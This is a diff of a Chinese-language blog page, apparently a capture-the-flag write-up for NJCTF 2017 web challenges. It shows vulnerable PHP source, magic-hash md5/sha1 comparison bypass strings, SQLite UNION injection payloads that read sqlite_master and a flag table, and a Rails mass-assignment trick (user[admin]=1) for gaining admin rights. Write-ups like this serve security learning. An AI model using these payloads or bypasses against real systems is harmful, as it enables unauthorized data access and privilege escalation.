@@ -12,6 +12,14 @@
   <!-- css files -->
   <link href="/static/css/default.min.css" rel="stylesheet">
   
+<link href="//cdn.bootcss.com/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    /*.hljs-pre{color:#a6e22e}*/
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
   <!-- favicon icon files -->
   <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
   <link rel="icon" href="/static/img/favicon.ico">
@@ -96,16 +104,14 @@
             <!-- <div class="clearfix"></div> -->
             <section class="article-content markdown-body">
                 <h2>Sqlite SQL Injection</h2>
-
 <h3>Source Code</h3>
-
 <pre><code>&lt;?php
-require_once &quot;db.php&quot;;
+require_once "db.php";
 $auth = 0;
 
-if (isset($_COOKIE[&quot;auth&quot;])) {
-    $auth = $_COOKIE[&quot;auth&quot;];
-    $hsh = $_COOKIE[&quot;hsh&quot;];
+if (isset($_COOKIE["auth"])) {
+    $auth = $_COOKIE["auth"];
+    $hsh = $_COOKIE["hsh"];
     if ($auth == $hsh) {
         $auth = 0;
     } else {
@@ -118,110 +124,75 @@ if (isset($_COOKIE[&quot;auth&quot;])) {
 } else {
     $auth = 0;
     $s = $auth;
-    setcookie(&quot;auth&quot;, $s);
-    setcookie(&quot;hsh&quot;, sha1((string) $s));
+    setcookie("auth", $s);
+    setcookie("hsh", sha1((string) $s));
 }
 if ($auth) {
-    if (isset($_GET[&#39;query&#39;])) {
+    if (isset($_GET['query'])) {
         $db = new SQLite3($SQL_DATABASE, SQLITE3_OPEN_READONLY);
-        $qstr = SQLITE3::escapeString($_GET[&#39;query&#39;]);
-        $query = &quot;SELECT amount FROM my_wallets WHERE id={$qstr}&quot;;
+        $qstr = SQLITE3::escapeString($_GET['query']);
+        $query = "SELECT amount FROM my_wallets WHERE id={$qstr}";
         $result = $db-&gt;querySingle($query);
         if (!$result === NULL) {
-            echo &quot;Error - invalid query&quot;;
+            echo "Error - invalid query";
         } else {
-            echo &quot;Wallet contains: {$result}&quot;;
+            echo "Wallet contains: {$result}";
         }
     } else {
-        echo &quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Admin Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Welcome to the admin panel!&lt;br /&gt;&lt;br /&gt;&lt;form name=&#39;input&#39; action=&#39;admin.php&#39; method=&#39;get&#39;&gt;Wallet ID: &lt;input type=&#39;text&#39; name=&#39;query&#39;&gt;&lt;input type=&#39;submit&#39; value=&#39;Submit Query&#39;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
+        echo "&lt;html&gt;&lt;head&gt;&lt;title&gt;Admin Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Welcome to the admin panel!&lt;br /&gt;&lt;br /&gt;&lt;form name='input' action='admin.php' method='get'&gt;Wallet ID: &lt;input type='text' name='query'&gt;&lt;input type='submit' value='Submit Query'&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;";
     }
 } else {
-    echo &quot;Sorry, not authorized.&quot;;
+    echo "Sorry, not authorized.";
 }
 </code></pre>
-
 <h3>First</h3>
-
 <p>我們需要繞過</p>
-
 <pre><code>sha1((string) $hsh) == md5((string) $auth
 </code></pre>
-
-<p>一個簡單的弱類型漏洞，只要md5和sha1密文為0exxx...即可</p>
-
-<pre><code>md5(&quot;QNKCDZO&quot;) == sha1(&quot;aaK1STfY&quot;)
+<p>一個簡單的弱類型漏洞，只要md5和sha1密文為0exxx&hellip;即可</p>
+<pre><code>md5("QNKCDZO") == sha1("aaK1STfY")
 </code></pre>
-
 <p>平時注意收集</p>
-
 <h3>Next</h3>
-
-<pre><code>$query = &quot;SELECT amount FROM my_wallets WHERE id={$qstr}&quot;;
+<pre><code>$query = "SELECT amount FROM my_wallets WHERE id={$qstr}";
 </code></pre>
-
 <p>有<strong>SQLITE3::escapeString</strong>過濾但無單引號的數值型注入</p>
-
 <h4>從數據庫找到所有表</h4>
-
 <pre><code>-1 union select table_name from sqlite_master limit 1,1
 </code></pre>
-
 <h4>發現flag表，查詢flag表的字段</h4>
-
 <pre><code>-1 union select sql from sqlite_master limit 1,1
 </code></pre>
-
 <h4>發現id類型為varchar(255),flag很有藏在其中</h4>
-
 <pre><code>-1 union select id from flag limit 1,1
 </code></pre>
-
 <h3>Finally</h3>
-
 <p><strong>Payload</strong></p>
-
 <pre><code>query=-1%20union%20select%20id%20from%20flag%20limit%201,1
 </code></pre>
-
 <p>Get it!</p>
-
 <h2>Ruby on Rails</h2>
-
 <p>也是源碼審計，然而是我不會的rb，即使如此我也是硬著頭皮往下看</p>
-
 <p>大致瀏覽文件，在<code>config/routes.rb</code>中可以看到一些路由的定義</p>
-
 <p>結合部署好的web網頁，不難找到其中的邏輯。</p>
-
 <p>註冊了個賬號，各種操作，發現只有Profile以及Micropost可以寫入數據</p>
-
-<p>然後發現<code>./app/views/users/_user.html.erb</code>中又****</p>
-
-<p>結合下一句<strong>&lt;% if current<em>user.admin? &amp;&amp; !current</em>user?(user) %&gt;</strong></p>
-
+<p>然後發現<code>./app/views/users/_user.html.erb</code>中又<strong><!--flag is here--></strong></p>
+<p>結合下一句<strong>&lt;% if current_user.admin? &amp;&amp; !current_user?(user) %&gt;</strong></p>
 <p>可以判斷很有可能是越權，此處應該有flag</p>
-
 <p>然後在<code>./app/controllers/users_controller.rb</code>可以看到</p>
-
 <pre><code>params.require(:user).permit(:name, :email, :password, :password_confirmation, :admin)
 </code></pre>
-
 <p>而<code>./app/views/users/edit.html.erb</code>中沒有admin表單輸入</p>
-
 <p>很明顯提交<code>user[admin]=1</code>即可成為管理員</p>
-
 <p>然後再某個頁面就能看到一大波的flag~~</p>
-
 <h2>The end</h2>
-
 <p>隨便看看，隨便做做也就這樣了</p>
-
             </section>
             <div class="article-copyright">
               <span>本文标题&nbsp;:&nbsp;</span><a href="/2017/03/16/some_web_writeups_for_njctf_2017.html" target="_blank">NJCTF 2017 some web writeups</a><br />
               <span>文章作者&nbsp;:&nbsp;</span><a href="https://www.virzz.com" target="_blank">Virink</a><br />
               <span>发布时间&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2017-03-16 02:24:32">2017-03-16 02:24:32</time><br />
-              <span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2017-06-01 23:35:13">2017-06-01 23:35:13</time><br />
+              <span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2018-07-31 12:03:26">2018-07-31 12:03:26</time><br />
               <span>本文链接&nbsp;:&nbsp;</span><a href="https://www.virzz.com/2017/03/16/some_web_writeups_for_njctf_2017.html" title="NJCTF 2017 some web writeups" target="_blank">https://www.virzz.com/2017/03/16/some_web_writeups_for_njctf_2017.html</a><br />
               <span>转载声明&nbsp;:&nbsp;</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。<br />
               <span>转载说明&nbsp;:&nbsp;</span><i class="fa fa-exclamation-circle"></i>本卡片有模板生成，本人转载来的文章请忽略~~
